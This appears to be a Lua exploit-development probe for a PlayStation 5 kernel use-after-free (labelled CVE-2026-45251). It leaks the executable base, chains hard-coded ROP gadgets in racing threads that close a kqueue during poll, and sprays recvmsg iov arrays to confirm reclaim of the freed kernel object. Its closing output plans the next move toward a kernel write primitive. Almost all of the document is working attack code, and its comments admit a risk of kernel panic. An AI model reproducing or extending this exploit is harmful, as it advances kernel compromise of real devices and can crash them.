-- CRASH_CLASS: RISKY (kernel panic if kq_sel offset differs from +0x48)
-- PROBE 500o: SAFE reclaim oracle for CVE-2026-45251.
--
-- FIXES from 500n:
--   500n had ALL iov[i].iov_len = 1. If reclaim placed the iov array over
--   the freed kqueue, TAILQ_REMOVE in selfdfree reads [kq+0x48] as a
--   pointer. With iov[4].iov_len = 1, that's address 0x1 -> kernel page
--   fault -> panic -> PS5 reboot. So 500n's "clean" result in 2 iterations
--   might have been luck: reclaim would have CRASHED, not returned EFAULT.
--
-- This probe sets iov[4].iov_len = 0 specifically. With kq_sel at +0x48:
--   TAILQ_REMOVE reads [kq+0x48] = 0 = NULL -> takes the safe branch
--   Writes [kq+0x48] = 0 (no-op) and [kq+0x50] = kq+0x48 (kernel ptr)
--   -> iov[5].iov_base = kernel ptr -> copyout EFAULT -> recvmsg returns -1
--
-- WARNING: if Sony added fields to struct kqueue and kq_sel is at +0x50,
-- +0x58, etc., the 0-valued entry may not be at the right offset and
-- TAILQ_REMOVE may still crash. This is accepted risk.
--
-- Oracle:
--   recvmsg_ret == send_count   -> no reclaim (iov intact)
--   recvmsg_ret == 0xFFFFFFFF.. -> EFAULT -> RECLAIM CONFIRMED
--   process died                -> reclaim + kq_sel offset mismatch (crash)
--
-- 25 iterations at iovcnt=16 (256B iov = kqueue zone on upstream FreeBSD 11)
-- 10 iterations at iovcnt=32 (512B, if Sony enlarged struct kqueue)

print("=== PROBE 500o: SAFE RECLAIM ORACLE (CVE-2026-45251) ===")
print("")
print("WARNING: if reclaim lands on a live kernel object instead of our iov,")
print("or if kq_sel is not at +0x48, the kernel may panic.")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Fake TCB
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 8 do wq(N(fake_tcb) + i, uint64(N(fake_tcb))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))
local one_byte = memory.alloc(8)
wd(N(one_byte), 0x42)

-- SIG_IGN SIGSEGV/SIGBUS/SIGSYS
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local function make_gate()
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sv))) end)
    local r = rd(N(sv)) or 0xFFFF
    local w = rd(N(sv) + 4) or 0xFFFF
    if r == 0xFFFF or w == 0xFFFF then return nil, nil end
    return r, w
end

local function make_stack()
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    return sb, rsp
end

local function build_poller(gate_rd, pollfd_addr, marker_addr, timeout_ms)
    local sb, rsp = make_stack()
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(pollfd_addr))
    emit(g_pop_rsi); emit(uint64(1))
    emit(g_pop_rdx); emit(uint64(timeout_ms))
    emit(g_pop_rax); emit(uint64(209)); emit(stub)
    emit(g_pop_rdi); emit(uint64(marker_addr))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local function build_closer_sprayer(gate_rd, target_fd, close_marker, sock_rd,
                                    msghdr_addr, ret_marker)
    local sb, rsp = make_stack()
    local off = 0
    local function emit(v) wq(rsp + off, v); off = off + 8 end
    emit(g_pop_rdi); emit(uint64(129))
    emit(g_pop_rsi); emit(uint64(N(tcb_ptr)))
    emit(g_pop_rax); emit(uint64(165)); emit(stub)
    emit(g_pop_rdi); emit(uint64(gate_rd))
    emit(g_pop_rsi); emit(uint64(N(one_byte)))
    emit(g_pop_rdx); emit(uint64(1))
    emit(g_pop_rax); emit(uint64(3)); emit(stub)
    emit(g_pop_rdi); emit(uint64(target_fd))
    emit(g_pop_rax); emit(uint64(6)); emit(stub)
    emit(g_pop_rax); emit(uint64(1))
    emit(g_pop_rdi); emit(uint64(close_marker))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(sock_rd))
    emit(g_pop_rsi); emit(uint64(msghdr_addr))
    emit(g_pop_rdx); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(27)); emit(stub)   -- recvmsg (27, not 29!)
    emit(g_pop_rdi); emit(uint64(ret_marker))
    emit(g_mov_m_rax)
    emit(g_pop_rdi); emit(uint64(0))
    emit(g_pop_rax); emit(uint64(431)); emit(stub)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    return par
end

local sc_kqueue = mk(362)

-- iovcnt=16 -> iov[4] at offset 0x40:
--   iov[4].iov_base = offset 0x40..0x47
--   iov[4].iov_len  = offset 0x48..0x4F  <- si_tdlist.tqh_first (MUST be 0)
-- iov[5] at offset 0x50:
--   iov[5].iov_base = offset 0x50..0x57  <- si_tdlist.tqh_last (gets kernel ptr)
--   iov[5].iov_len  = offset 0x58..0x5F  <- unchanged (1) -> EFAULT on kernel base

local function run_once(label, iovcnt)
    local iov_bytes = iovcnt * 16
    -- send_count = iovcnt - 1 because iov[4].iov_len=0 (one less receiving byte)
    local send_count = iovcnt - 1
    print("[" .. label .. "] iovcnt=" .. iovcnt ..
          " (" .. iov_bytes .. "B iov, send=" .. send_count .. "B)")

    -- iov array: each entry {base=&data[i], len=1} EXCEPT iov[4].len=0
    local iov_area = memory.alloc(iov_bytes + 16)
    local data_area = memory.alloc(iovcnt + 16)
    for i = 0, iovcnt - 1 do
        wq(N(iov_area) + i * 16, uint64(N(data_area) + i))
        if i == 4 then
            -- CRITICAL: iov[4].iov_len = 0 for safe TAILQ_REMOVE
            wq(N(iov_area) + i * 16 + 8, uint64(0))
        else
            wq(N(iov_area) + i * 16 + 8, uint64(1))
        end
        -- Sentinel byte at each data slot
        wd(N(data_area) + i, 0xAA)
    end

    -- Send buffer: send_count bytes of 0x42
    local send_area = memory.alloc(send_count + 16)
    for i = 0, send_count - 1 do
        wd(N(send_area) + i, 0x42)
    end

    local mh = memory.alloc(0x30)
    for i = 0, 0x2C, 4 do wd(N(mh) + i, 0) end
    wq(N(mh) + 0x00, uint64(0))
    wd(N(mh) + 0x08, 0)
    wq(N(mh) + 0x10, uint64(N(iov_area)))
    wd(N(mh) + 0x18, iovcnt)
    wq(N(mh) + 0x20, uint64(0))
    wd(N(mh) + 0x28, 0)

    local kq = sgn(sc_kqueue())
    if kq < 0 then print("  kqueue FAIL"); return "fail" end

    local gA_r, gA_w = make_gate()
    local gB_r, gB_w = make_gate()
    if not gA_r or not gB_r then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  gate FAIL"); return "fail"
    end

    -- Spray socketpair: SOCK_STREAM (type=1) for partial-read tolerance
    local sv = memory.alloc(8)
    wd(N(sv), 0xFFFF); wd(N(sv) + 4, 0xFFFF)
    pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), uint64(N(sv))) end)
    local sr = rd(N(sv)) or 0xFFFF
    local sw = rd(N(sv) + 4) or 0xFFFF
    if sr == 0xFFFF or sw == 0xFFFF then
        pcall(function() mk(6)(uint64(kq)) end)
        print("  socketpair FAIL"); return "fail"
    end

    local pollfd = memory.alloc(8)
    wd(N(pollfd), kq); wd(N(pollfd) + 4, 0x00010000)  -- POLLIN

    local mA = memory.alloc(8); wd(N(mA), 0); wd(N(mA) + 4, 0xAA)
    local mClose = memory.alloc(8); wd(N(mClose), 0); wd(N(mClose) + 4, 0)
    local mRet = memory.alloc(8); wd(N(mRet), 0); wd(N(mRet) + 4, 0xBB)

    -- Launch poller: poll(kq, POLLIN, 1000ms)
    pcall(function() mk(455)(build_poller(gA_r, N(pollfd), N(mA), 1000), uint64(0x38)) end)
    -- Launch closer: close(kq) then recvmsg(sr, mh, 0)
    pcall(function()
        mk(455)(build_closer_sprayer(gB_r, kq, N(mClose), sr, N(mh), N(mRet)), uint64(0x38))
    end)

    -- Open gate A: poller enters kernel first
    pcall(function() mk(4)(uint64(gA_w), uint64(N(one_byte)), uint64(1)) end)
    -- Brief delay for poller to enter sleep
    for d = 1, 50000 do local _ = rd(N(mA)) end

    -- Open gate B: closer fires close(kq) then recvmsg
    pcall(function() mk(4)(uint64(gB_w), uint64(N(one_byte)), uint64(1)) end)
    -- Wait for close marker
    for w = 1, 200000 do
        if rd(N(mClose)) == 1 then break end
    end
    -- Give recvmsg time to allocate iov + block
    for d = 1, 300000 do local _ = rd(N(mA)) end
    if not alive() then return "died_after_close" end

    -- Wait for poller timeout -> seltdclear -> selfdfree writes into freed kq
    for w = 1, 4000000 do
        if not alive() then return "died_seltdclear" end
        if rd(N(mA) + 4) ~= 0xAA then break end
    end
    if not alive() then return "died_after_timeout" end

    -- Now release the spray: send data into the peer socket
    -- Use write(4) instead of write through mk(4) for the send_area
    pcall(function() mk(4)(uint64(sw), uint64(N(send_area)), uint64(send_count)) end)

    -- Wait for closer's recvmsg to return
    for w = 1, 2000000 do
        if not alive() then return "died_recv" end
        if rd(N(mRet) + 4) ~= 0xBB then break end
    end

    local rv = rq(uint64(N(mRet)))
    local rvh, rvl = 0, 0
    if type(rv) == "table" and rv.h then rvh, rvl = rv.h, rv.l else rvl = N(rv) end
    print("  recvmsg_ret=" .. string.format("0x%08X%08X", rvh, rvl))

    -- Check data sentinels: which bytes got written?
    local written = {}
    local sentinel_intact = {}
    for i = 0, iovcnt - 1 do
        local b = rd(N(data_area) + i)
        if b ~= nil then b = b % 256 end
        if b == 0x42 then
            written[#written + 1] = i
        elseif b == 0xAA then
            sentinel_intact[#sentinel_intact + 1] = i
        end
    end
    if #written > 0 then
        print("  data_written_to=" .. table.concat(written, ","))
    end
    if #sentinel_intact > 0 and #sentinel_intact < iovcnt then
        print("  sentinel_intact=" .. table.concat(sentinel_intact, ","))
    end

    -- Cleanup
    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)
    pcall(function() mk(6)(uint64(gA_r)) end); pcall(function() mk(6)(uint64(gA_w)) end)
    pcall(function() mk(6)(uint64(gB_r)) end); pcall(function() mk(6)(uint64(gB_w)) end)

    local low = N(rvl)
    if rvh == 0xFFFFFFFF or low == 0xFFFFFFFF then
        return "EFAULT"
    elseif low < send_count and low > 0 then
        return "SHORT(" .. low .. "/" .. send_count .. ")"
    elseif low == send_count then
        return "clean(" .. low .. ")"
    elseif low == 0 and rd(N(mRet) + 4) == 0xBB then
        return "timeout(marker_unchanged)"
    else
        return "unexpected(0x" .. string.format("%08X%08X", rvh, rvl) .. ")"
    end
end

print("--- Phase 1: iovcnt=16 (256B zone, upstream kqueue size) ---")
print("")

local results_256 = {}
local hit_256 = 0
for iter = 1, 25 do
    if not alive() then
        print("Process died at iteration " .. iter)
        break
    end
    local r = run_once(string.format("256B %02d/25", iter), 16)
    print("  -> " .. tostring(r))
    results_256[#results_256 + 1] = r
    if r == "EFAULT" or (r and r:sub(1,5) == "SHORT") then
        hit_256 = hit_256 + 1
        print("  *** RECLAIM DETECTED at iteration " .. iter .. " ***")
    end
    if r and r:sub(1,4) == "died" then
        print("  *** CRASH at iteration " .. iter .. " (reclaim + offset mismatch?) ***")
        break
    end
    print("")
end

print("")
print("--- Phase 2: iovcnt=32 (512B zone, enlarged kqueue?) ---")
print("")

local results_512 = {}
local hit_512 = 0
if alive() then
    for iter = 1, 10 do
        if not alive() then
            print("Process died at iteration " .. iter)
            break
        end
        local r = run_once(string.format("512B %02d/10", iter), 32)
        print("  -> " .. tostring(r))
        results_512[#results_512 + 1] = r
        if r == "EFAULT" or (r and r:sub(1,5) == "SHORT") then
            hit_512 = hit_512 + 1
            print("  *** RECLAIM DETECTED at iteration " .. iter .. " ***")
        end
        if r and r:sub(1,4) == "died" then
            print("  *** CRASH at iteration " .. iter .. " ***")
            break
        end
        print("")
    end
end

print("========================================")
print("SUMMARY:")
print("  256B zone: " .. #results_256 .. " iterations, " .. hit_256 .. " reclaim hits")
print("  512B zone: " .. #results_512 .. " iterations, " .. hit_512 .. " reclaim hits")
print("")

if hit_256 > 0 or hit_512 > 0 then
    print("RECLAIM CONFIRMED.")
    print("The freed kqueue (malloc M_KQUEUE, general zone) is reused by iov spray.")
    print("selfdfree TAILQ_REMOVE writes [kq_sel+0]=0, [kq_sel+8]=kq_sel.")
    print("This corrupts the kernel iov array -> EFAULT on copyout.")
    print("")
    print("NEXT: characterize the write primitive and identify victim objects.")
    if hit_256 > 0 then
        print("  Hit zone: 256B (kqueue ~240B, upstream FreeBSD 11)")
    end
    if hit_512 > 0 then
        print("  Hit zone: 512B (Sony enlarged kqueue)")
    end
else
    print("NO RECLAIM in " .. (#results_256 + #results_512) .. " iterations.")
    print("")
    print("Possible causes:")
    print("  1. close(kq) defers free to taskqueue (different CPU)")
    print("     Evidence: kernel_data.bin has 'File descriptors deferred to taskqueue'")
    print("  2. UMA per-CPU bucket miss (closer thread on different CPU from main)")
    print("  3. Sony kqueue in a different size class (not 256B or 512B)")
    print("")
    print("NEXT STEPS:")
    print("  a. Probe deferred close directly (close + immediate same-type alloc)")
    print("  b. Multi-CPU mass spray (spawn sprayers on all CPUs)")
    print("  c. Try socket fd as poll target (socket zone has UMA_ZONE_NOFREE,")
    print("     but try smaller objects: pipe is also dedicated)")
end
print("")
print("alive=" .. tostring(alive()))
print("=== PROBE 500o COMPLETE ===")
